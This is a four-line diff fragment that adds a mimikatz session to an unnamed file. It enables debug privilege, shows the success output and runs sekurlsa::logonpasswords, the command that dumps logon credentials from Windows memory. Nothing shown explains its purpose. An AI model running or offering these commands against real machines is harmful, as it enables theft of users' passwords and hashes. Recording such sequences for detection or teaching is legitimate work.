@@ -1,0 +1,4 @@
+mimikatz.exe
+mimikatz # privilege::debug
+Privilege '20' OK
+mimikatz # sekurlsa::logonpasswords
